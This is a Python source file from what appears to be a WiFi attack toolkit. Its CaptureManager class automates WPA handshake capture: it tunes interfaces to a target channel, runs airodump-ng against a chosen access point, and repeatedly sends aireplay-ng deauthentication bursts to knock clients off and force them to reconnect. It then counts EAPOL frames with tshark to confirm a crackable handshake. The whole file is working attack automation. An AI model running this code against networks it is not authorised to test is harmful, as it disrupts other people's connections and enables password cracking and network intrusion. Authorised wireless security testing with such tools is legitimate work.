"""Handshake capture manager."""

from __future__ import annotations

from datetime import datetime
import logging
import os
from pathlib import Path
import signal
import subprocess
import threading
import time
from typing import Callable, Optional, Tuple

from wifi_launchpad.app.settings import get_settings
from wifi_launchpad.domain.capture import Handshake

from .models import CaptureConfig, CaptureStatus

logger = logging.getLogger(__name__)


class CaptureManager:
    """Manage handshake capture with airodump-ng and aireplay-ng."""

    def __init__(self, monitor_interface: str, injection_interface: Optional[str] = None):
        self.monitor_interface = monitor_interface
        self.injection_interface = injection_interface or monitor_interface
        self.capture_process: Optional[subprocess.Popen] = None
        self.deauth_process: Optional[subprocess.Popen] = None
        self.capture_thread: Optional[threading.Thread] = None
        self.deauth_thread: Optional[threading.Thread] = None
        self.status = CaptureStatus.IDLE
        self.config: Optional[CaptureConfig] = None
        self.captured_handshake: Optional[Handshake] = None
        self.capture_start_time: Optional[datetime] = None
        self.pcap_file: Optional[str] = None
        self.stats = {
            "deauth_packets_sent": 0,
            "capture_attempts": 0,
            "validation_checks": 0,
            "time_to_capture": 0.0,
        }
        self.on_handshake_captured: Optional[Callable[[Handshake], None]] = None
        self.on_status_change: Optional[Callable[[CaptureStatus], None]] = None
        get_settings().capture_dir.mkdir(parents=True, exist_ok=True)

    def capture_handshake(self, config: CaptureConfig) -> Tuple[bool, Optional[Handshake]]:
        """Capture a handshake for the configured target."""

        if self.status != CaptureStatus.IDLE:
            logger.warning("Capture already in progress")
            return False, None

        self.config = config
        if not config.output_dir:
            self.config.output_dir = str(get_settings().capture_dir)
        self.captured_handshake = None
        self.stats["capture_attempts"] += 1
        self.capture_start_time = datetime.now()
        Path(self.config.output_dir).mkdir(parents=True, exist_ok=True)
        self._set_status(CaptureStatus.CAPTURING)
        logger.info("Starting handshake capture for %s", config.target_bssid)

        if not self._set_channel(config.target_channel) or not self._start_capture():
            self._set_status(CaptureStatus.FAILED)
            return False, None

        self.capture_thread = threading.Thread(target=self._capture_monitor, daemon=True)
        self.capture_thread.start()
        self.deauth_thread = threading.Thread(target=self._deauth_worker, daemon=True)
        self.deauth_thread.start()

        started = time.time()
        while self.status in {CaptureStatus.CAPTURING, CaptureStatus.DEAUTHING, CaptureStatus.VALIDATING}:
            if time.time() - started > config.capture_timeout:
                logger.warning("Capture timeout reached")
                self._set_status(CaptureStatus.TIMEOUT)
                break
            time.sleep(1)

        self._stop_capture()
        if self.capture_start_time:
            self.stats["time_to_capture"] = (datetime.now() - self.capture_start_time).total_seconds()

        success = self.status == CaptureStatus.SUCCESS
        result = self.captured_handshake
        self.status = CaptureStatus.IDLE
        return success, result

    def _set_channel(self, channel: int) -> bool:
        # Set channel on BOTH monitor and injection interfaces
        for iface in {self.monitor_interface, self.injection_interface}:
            try:
                subprocess.run(
                    ["sudo", "iw", "dev", iface, "set", "channel", str(channel)],
                    check=True,
                    capture_output=True,
                )
                logger.debug("Set %s to channel %s", iface, channel)
            except subprocess.CalledProcessError as exc:
                logger.error("Failed to set channel on %s: %s", iface, exc)
                return False
        return True

    def _start_capture(self) -> bool:
        if not self.config:
            return False

        output_prefix = Path(self.config.output_dir) / f"handshake_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        cmd = [
            "sudo",
            "airodump-ng",
            "--bssid",
            self.config.target_bssid,
            "--channel",
            str(self.config.target_channel),
            "--write",
            str(output_prefix),
            "--output-format",
            "pcap,csv",
            "--write-interval",
            str(self.config.write_interval),
            self.monitor_interface,
        ]
        try:
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid,
            )
        except Exception as exc:
            logger.error("Failed to start capture: %s", exc)
            return False

        self.pcap_file = f"{output_prefix}-01.cap"
        logger.info("Started capture on %s", self.config.target_bssid)
        return True

    def _stop_capture(self) -> None:
        self._stop_process(self.capture_process, kill_group=True)
        self.capture_process = None
        self._stop_process(self.deauth_process)
        self.deauth_process = None
        for thread in (self.capture_thread, self.deauth_thread):
            if thread and thread.is_alive():
                thread.join(timeout=2)

    def _stop_process(self, process: Optional[subprocess.Popen], kill_group: bool = False) -> None:
        if not process:
            return
        try:
            if kill_group:
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            else:
                process.terminate()
            process.wait(timeout=5 if kill_group else 2)
        except Exception:
            try:
                if kill_group:
                    os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                else:
                    process.kill()
            except Exception:
                pass

    def _capture_monitor(self) -> None:
        if not self.config or not self.pcap_file:
            return

        pcap_file = Path(self.pcap_file)
        while self.status in {CaptureStatus.CAPTURING, CaptureStatus.DEAUTHING}:
            time.sleep(5)
            if not pcap_file.exists():
                continue
            self._set_status(CaptureStatus.VALIDATING)
            self.stats["validation_checks"] += 1
            handshake = self._validate_capture(str(pcap_file))
            if handshake and handshake.quality_score >= self.config.min_quality_score:
                self.captured_handshake = handshake
                self._set_status(CaptureStatus.SUCCESS)
                if self.on_handshake_captured:
                    self.on_handshake_captured(handshake)
                logger.info("Handshake captured! Quality: %.1f", handshake.quality_score)
                return
            self._set_status(CaptureStatus.CAPTURING)

    def _deauth_worker(self) -> None:
        if not self.config:
            return
        time.sleep(5)
        for index in range(self.config.deauth_count):
            if self.status not in {CaptureStatus.CAPTURING, CaptureStatus.DEAUTHING}:
                return
            self._set_status(CaptureStatus.DEAUTHING)
            self._send_deauth()
            self.stats["deauth_packets_sent"] += 10
            if index < self.config.deauth_count - 1:
                time.sleep(self.config.deauth_interval)
        if self.status == CaptureStatus.DEAUTHING:
            self._set_status(CaptureStatus.CAPTURING)

    def _send_deauth(self) -> None:
        if not self.config:
            return
        cmd = [
            "sudo", "aireplay-ng",
            "--ignore-negative-one",
            "--deauth", "10",
            "-a", self.config.target_bssid,
        ]
        if self.config.deauth_client:
            cmd.extend(["-c", self.config.deauth_client])
        cmd.append(self.injection_interface)
        try:
            self.deauth_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.deauth_process.wait(timeout=15)
        except Exception as exc:
            logger.error("Failed to send deauth: %s", exc)

    def _validate_capture(self, pcap_file: str) -> Optional[Handshake]:
        if not self.config or not Path(pcap_file).exists():
            return None
        try:
            result = subprocess.run(
                ["tshark", "-r", pcap_file, "-Y", "eapol", "-T", "fields", "-e", "eapol.type"],
                capture_output=True,
                text=True,
                timeout=5,
            )
        except Exception as exc:
            logger.error("Failed to validate capture: %s", exc)
            return None

        eapol_count = len([line for line in result.stdout.splitlines() if line])
        if eapol_count < 2:
            return None

        handshake = Handshake(
            bssid=self.config.target_bssid,
            ssid=self.config.target_ssid or "Unknown",
            client_mac="FF:FF:FF:FF:FF:FF",
            pcap_file=pcap_file,
            file_size=Path(pcap_file).stat().st_size,
            eapol_packets=eapol_count,
            capture_method="deauth",
            deauth_count=self.stats["deauth_packets_sent"],
            time_to_capture=self.stats["time_to_capture"],
        )
        handshake.quality_score = min(eapol_count * 25, 100)
        handshake.is_complete = eapol_count >= 4
        return handshake

    def _set_status(self, status: CaptureStatus) -> None:
        self.status = status
        if self.on_status_change:
            self.on_status_change(status)
        logger.debug("Capture status: %s", status.value)

    def stop(self) -> None:
        """Stop all capture operations."""

        self._stop_capture()
        self._set_status(CaptureStatus.IDLE)
        logger.info("Capture manager stopped")

